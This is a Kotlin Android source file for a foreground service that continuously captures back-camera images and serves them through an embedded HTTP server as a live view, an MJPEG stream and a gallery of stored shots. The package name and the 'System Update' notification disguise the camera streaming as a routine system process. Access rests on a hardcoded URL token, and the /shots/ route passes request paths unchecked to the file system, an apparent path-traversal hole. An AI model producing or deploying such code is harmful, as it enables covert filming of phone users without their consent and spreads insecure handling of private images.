package com.system.update

import android.app.*
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.os.Build
import android.os.IBinder
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageAnalysis
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import fi.iki.elonen.NanoHTTPD
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.concurrent.Executors

class LiveService : Service() {

    private val owner = CameraOwner()
    private val executor = Executors.newSingleThreadExecutor()
    private lateinit var server: MjpegServer
    private var provider: ProcessCameraProvider? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "stop") { stopSelf(); return START_NOT_STICKY }
        notify_()
        val shots = File(getExternalFilesDir(null), "shots").apply { mkdirs() }
        server = MjpegServer(8080, shots).also { it.start() }
        val future = ProcessCameraProvider.getInstance(this)
        future.addListener({
            try {
                val p = future.get()
                provider = p
                val analysis = ImageAnalysis.Builder()
                    .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_RGBA_8888)
                    .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                    .build()
                var last = 0L
                analysis.setAnalyzer(executor) { proxy ->
                    val now = System.currentTimeMillis()
                    if (now - last > 120) {
                        last = now
                        runCatching {
                            val bmp = proxy.toBitmap()
                            val rot = Bitmap.createBitmap(bmp, 0, 0,
                                bmp.width, bmp.height,
                                android.graphics.Matrix().apply {
                                    postRotate(proxy.imageInfo.rotationDegrees.toFloat())
                                }, true)
                            val out = ByteArrayOutputStream()
                            rot.compress(Bitmap.CompressFormat.JPEG, 55, out)
                            server.push(out.toByteArray())
                        }
                    }
                    proxy.close()
                }
                owner.start()
                p.unbindAll()
                p.bindToLifecycle(owner, CameraSelector.DEFAULT_BACK_CAMERA, analysis)
            } catch (e: Exception) { stopSelf() }
        }, ContextCompat.getMainExecutor(this))
        return START_STICKY
    }

    private fun notify_() {
        val nm = getSystemService(NotificationManager::class.java)
        if (Build.VERSION.SDK_INT >= 26) {
            nm.createNotificationChannel(
                NotificationChannel("live", "Live", NotificationManager.IMPORTANCE_LOW))
        }
        val stop = PendingIntent.getService(this, 0,
            Intent(this, LiveService::class.java).setAction("stop"),
            PendingIntent.FLAG_IMMUTABLE)
        val n = NotificationCompat.Builder(this, "live")
            .setContentTitle("System Update")
            .setContentText("http://localhost:8080/?k=CHANGEME123")
            .setSmallIcon(android.R.drawable.stat_sys_download_done)
            .addAction(0, "Stop", stop)
            .setOngoing(true).build()

        if (Build.VERSION.SDK_INT >= 29)
            startForeground(2, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
        else startForeground(2, n)
    }

    override fun onDestroy() {
        runCatching { provider?.unbindAll() }
        runCatching { server.stop() }
        owner.stop()
        executor.shutdown()
        super.onDestroy()
    }
}

class MjpegServer(port: Int, private val dir: File) : NanoHTTPD(port) {

    @Volatile private var latest: ByteArray? = null
    @Volatile private var alive = true

    private val token = "CHANGEME123"

    override fun serve(session: IHTTPSession): Response {
        val u = session.uri
        if (session.parameters["k"]?.firstOrNull() != token)
            return newFixedLengthResponse(Response.Status.UNAUTHORIZED, "text/plain", "denied")

        return when {
            u == "/" -> {
                val html = """
                    <html><head>
                    <meta name="viewport" content="width=device-width,initial-scale=1">
                    <title>cam</title></head>
                    <body style="margin:0;background:#000;color:#ddd;font-family:-apple-system,sans-serif">
                    <img id="v" style="width:100%;display:block" src="/snap.jpg?k=$token">
                    <p style="padding:12px"><a href="/shots?k=$token" style="color:#8cf">gallery</a></p>
                    <script>
                    setInterval(function(){
                      document.getElementById('v').src = '/snap.jpg?k=$token&t=' + Date.now();
                    }, 400);
                    </script></body></html>
                """.trimIndent()
                newFixedLengthResponse(Response.Status.OK, "text/html", html)
            }

            u == "/snap.jpg" -> {
                val f = latest
                if (f == null) newFixedLengthResponse(Response.Status.NO_CONTENT, "image/jpeg", "")
                else newFixedLengthResponse(Response.Status.OK, "image/jpeg", f.inputStream(), f.size.toLong())
            }

            u == "/shots" -> {
                val files = dir.listFiles()
                    ?.filter { it.isFile && it.name.endsWith(".jpg") }
                    ?.sortedByDescending { it.name } ?: emptyList()
                val html = buildString {
                    append("<html><head><meta name='viewport' content='width=device-width,initial-scale=1'>")
                    append("</head><body style='background:#111;color:#eee;font-family:-apple-system,sans-serif;padding:8px'>")
                    append("<h3>${files.size} shots</h3>")
                    for (f in files) {
                        append("<div style='margin-bottom:10px'>")
                        append("<a href='/shots/${f.name}?k=$token' style='color:#8cf;font-size:12px'>${f.name}</a><br>")
                        append("<img src='/shots/${f.name}?k=$token' width='300'></div>")
                    }
                    append("</body></html>")
                }
                newFixedLengthResponse(Response.Status.OK, "text/html", html)
            }

            u.startsWith("/shots/") -> {
                val f = File(dir, u.removePrefix("/shots/"))
                if (!f.exists()) newFixedLengthResponse(Response.Status.NOT_FOUND, "text/plain", "missing")
                else newFixedLengthResponse(Response.Status.OK, "image/jpeg", f.inputStream(), f.length())
            }

            u == "/mjpeg" -> {
                val pipe = java.io.PipedOutputStream()
                val input = java.io.PipedInputStream(pipe, 1 shl 20)
                Thread {
                    try {
                        while (alive) {
                            val f = latest
                            if (f != null) {
                                pipe.write("--frame\r\nContent-Type: image/jpeg\r\nContent-Length: ${f.size}\r\n\r\n".toByteArray())
                                pipe.write(f)
                                pipe.write("\r\n".toByteArray())
                                pipe.flush()
                            }
                            Thread.sleep(100)
                        }
                    } catch (_: Exception) {}
                }.start()
                newChunkedResponse(Response.Status.OK,
                    "multipart/x-mixed-replace; boundary=frame", input)
                    .also { it.addHeader("Cache-Control", "no-cache") }
            }

            else -> newFixedLengthResponse("ok")
        }
    }

    fun push(jpeg: ByteArray) { latest = jpeg }
}
